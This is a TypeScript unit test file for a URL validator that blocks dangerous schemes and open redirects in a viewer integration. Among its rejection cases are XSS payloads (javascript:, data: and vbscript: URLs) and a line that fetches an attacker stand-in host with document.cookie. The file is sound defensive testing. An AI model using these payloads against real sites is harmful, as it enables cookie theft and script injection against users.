import { describe, expect, it } from 'vitest';

import {
  isNavigableBaseUrl,
  isNavigableOrigin,
  navigableUrlOrNull,
  originOf,
} from './navigable-url';

/**
 * The negative cases are the point of this file. A validator that only has happy-path tests is a
 * validator nobody has watched reject anything.
 */
describe('navigableUrlOrNull', () => {
  describe('dangerous schemes', () => {
    // `javascript:` is the whole reason this helper exists: it is what a customer-editable manifest
    // can put in `viewerOrigin`, and `new URL()` accepts it without complaint.
    it.each([
      ['javascript:alert(1)'],
      ['JavaScript:alert(1)'],
      ['  javascript:alert(1)  '],
      ['javascript:void(fetch("https://evil.example/"+document.cookie))'],
      ['data:text/html,<script>alert(1)</script>'],
      ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
      ['blob:https://app.example/1234'],
      ['file:///etc/hosts'],
      ['vbscript:msgbox(1)'],
    ])('rejects %s', (candidate) => {
      expect(navigableUrlOrNull(candidate, { allowInsecure: true })).toBeNull();
    });

    it('rejects a javascript: URL even when its own origin is in the allow-list', () => {
      // `new URL('javascript:…').origin` is the string 'null'. If a caller compared origins without
      // checking the scheme, an allow-list containing 'null' would let this through.
      expect(
        navigableUrlOrNull('javascript:alert(1)', {
          allowedOrigins: ['null', 'https://ok.example'],
        }),
      ).toBeNull();
    });
  });

  describe('malformed and empty input', () => {
    it.each([
      [null],
      [undefined],
      [''],
      ['   '],
      ['not a url'],
      ['http://'],
      ['://missing-scheme'],
    ])('rejects %s', (candidate) => {
      expect(navigableUrlOrNull(candidate as string | null | undefined)).toBeNull();
    });

    it('rejects a relative URL when no base says what relative means', () => {
      expect(navigableUrlOrNull('/nuxeo/api/v1/preview')).toBeNull();
    });
  });

  describe('http vs https', () => {
    it('rejects http by default', () => {
      expect(navigableUrlOrNull('http://viewer.example.com')).toBeNull();
    });

    it('permits http when the caller explicitly allows it', () => {
      expect(navigableUrlOrNull('http://localhost:9080', { allowInsecure: true })).toBe(
        'http://localhost:9080',
      );
    });

    it('permits https without any opt-in', () => {
      expect(navigableUrlOrNull('https://viewer.example.com')).toBe('https://viewer.example.com');
    });
  });

  describe('origin comparison', () => {
    it('accepts a URL whose origin is allowed', () => {
      expect(
        navigableUrlOrNull('https://ok.example/view?doc=1', {
          allowedOrigins: ['https://ok.example'],
        }),
      ).toBe('https://ok.example/view?doc=1');
    });

    it('rejects a URL from an origin that is not allowed', () => {
      expect(
        navigableUrlOrNull('https://evil.example/view', { allowedOrigins: ['https://ok.example'] }),
      ).toBeNull();
    });

    it('distinguishes port and scheme when comparing origins', () => {
      expect(
        navigableUrlOrNull('https://ok.example:8443/x', { allowedOrigins: ['https://ok.example'] }),
      ).toBeNull();
    });

    // The reason this helper resolves and compares origins instead of testing string prefixes.
    it.each([
      ['//evil.example/x', 'protocol-relative'],
      ['/\\evil.example/x', 'backslash-escaped'],
    ])('rejects %s (%s), which a startsWith("/") check would accept', (candidate) => {
      expect(
        navigableUrlOrNull(candidate, {
          base: 'https://app.example',
          allowedOrigins: ['https://app.example'],
        }),
      ).toBeNull();
    });

    it('accepts a root-relative URL as same-origin when a base is given', () => {
      expect(
        navigableUrlOrNull('/nuxeo/api/v1/preview', {
          base: 'https://app.example',
          allowedOrigins: ['https://app.example'],
        }),
      ).toBe('/nuxeo/api/v1/preview');
    });

    it('ignores empty allow-list entries rather than treating them as wildcards', () => {
      // NUXEO_API_ORIGIN is '' when the dev proxy is in use, so this case is routine.
      expect(
        navigableUrlOrNull('https://evil.example/x', { allowedOrigins: ['', null, undefined] }),
      ).toBeNull();
    });

    it('rejects everything when the allow-list has no usable entries', () => {
      // "No usable entries" must not degrade to "allow all" — that would turn a misconfiguration
      // into an open redirect.
      expect(navigableUrlOrNull('https://anything.example', { allowedOrigins: [] })).toBeNull();
    });

    it('returns the original string, not a normalised href', () => {
      // Validation must not silently change which bytes get loaded.
      const candidate = 'https://ok.example/a//b/../c?x=1';
      expect(navigableUrlOrNull(candidate, { allowedOrigins: ['https://ok.example'] })).toBe(
        candidate,
      );
    });
  });
});

describe('originOf', () => {
  it('reads the origin of an absolute URL', () => {
    expect(originOf('https://ok.example:8443/deep/path?q=1')).toBe('https://ok.example:8443');
  });

  it.each([[''], [null], [undefined], ['/relative'], ['not a url']])(
    'answers null for %s',
    (value) => {
      expect(originOf(value as string | null | undefined)).toBeNull();
    },
  );

  it('answers null for an opaque origin rather than the string "null"', () => {
    // Returning 'null' would make it comparable to another opaque origin and match.
    expect(originOf('javascript:alert(1)')).toBeNull();
    expect(originOf('data:text/plain,hi')).toBeNull();
  });
});

describe('isNavigableOrigin', () => {
  it('accepts an https origin', () => {
    expect(isNavigableOrigin('https://viewer.example.com')).toBe(true);
  });

  it('rejects an http origin unless insecure is permitted', () => {
    expect(isNavigableOrigin('http://localhost:9080')).toBe(false);
    expect(isNavigableOrigin('http://localhost:9080', true)).toBe(true);
  });

  it.each([['javascript:alert(1)'], [''], [null], ['viewer.example.com']])(
    'rejects %s',
    (value) => {
      expect(isNavigableOrigin(value as string | null, true)).toBe(false);
    },
  );
});

describe('isNavigableBaseUrl', () => {
  it('accepts an https origin, with or without a path', () => {
    expect(isNavigableBaseUrl('https://viewer.example.com')).toBe(true);
    // A path is legitimate — a viewer can be hosted under a prefix — and appending parameters to
    // it is well defined.
    expect(isNavigableBaseUrl('https://viewer.example.com/arender')).toBe(true);
  });

  it('rejects http unless insecure is permitted', () => {
    expect(isNavigableBaseUrl('http://localhost:9080')).toBe(false);
    expect(isNavigableBaseUrl('http://localhost:9080', true)).toBe(true);
  });

  // The three exclusions that distinguish this from `isNavigableOrigin`. Each is a URL a caller
  // would append `?url=` to and get something that does not carry a top-level `url` parameter, or
  // that leaks a credential into an iframe navigation.
  it.each([
    ['a query string', 'https://viewer.example.com/app?tenant=x'],
    ['a fragment', 'https://viewer.example.com/app#frag'],
    ['userinfo with a password', 'https://user:pass@viewer.example.com'],
    ['userinfo without a password', 'https://user@viewer.example.com'],
  ])('rejects a base carrying %s', (_label, value) => {
    expect(isNavigableBaseUrl(value, true)).toBe(false);
  });

  it('accepts a trailing question mark, which carries no parameter', () => {
    // `new URL()` normalises an empty query away, so `search` is `''` and there is nothing for an
    // appended parameter to collide with. Rejecting this would be stricter than the defect
    // requires — the harm came from concatenating onto a *populated* query, not from a stray `?`.
    expect(isNavigableBaseUrl('https://viewer.example.com/app?', true)).toBe(true);
  });

  it('rejects everything isNavigableOrigin rejected', () => {
    for (const value of ['javascript:alert(1)', '', null, 'viewer.example.com', '//host/x']) {
      expect(isNavigableBaseUrl(value as string | null, true)).toBe(false);
    }
  });
});
